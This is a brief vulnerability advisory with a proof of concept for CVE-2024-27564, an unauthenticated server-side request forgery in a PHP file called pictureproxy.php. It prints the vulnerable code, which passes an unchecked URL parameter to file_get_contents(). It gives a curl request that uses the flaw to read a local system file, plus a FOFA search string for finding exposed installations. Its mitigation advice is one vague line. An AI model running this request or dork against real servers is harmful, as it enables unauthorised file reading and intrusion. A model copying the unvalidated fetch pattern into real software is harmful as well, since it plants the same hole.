# CVE-2024-27564

## Description:
A vulnerability in `pictureproxy.php` allows remote attackers to perform arbitrary requests by injecting URLs into the url parameter. This SSRF vulnerability can be exploited without authentication, making it particularly dangerous.

The vulnerable code is in the `pictureproxy.php` file. The issue occurs because the function does not properly validate the `url` parameter. The `$_GET['url']` variable is passed to the `file_get_contents()` function, which fetches content from the specified URL. This can lead to SSRF.

## PoC:
```
<?php
if (isset($_GET['url'])) {
    $image = file_get_contents($_GET['url']);
    header("Content-type: image/jpeg");
    echo $image;
} else {
    echo "Invalid request";
}
```

Curl Request:
```
curl -i -s -k http://127.0.0.1/pictureproxy.php?url=file:///etc/password
```

## Dorking:
FOFA= `"title="ChatGPT个人专用版""`

## Mitigation:
Proper Management of Input validation is needed.
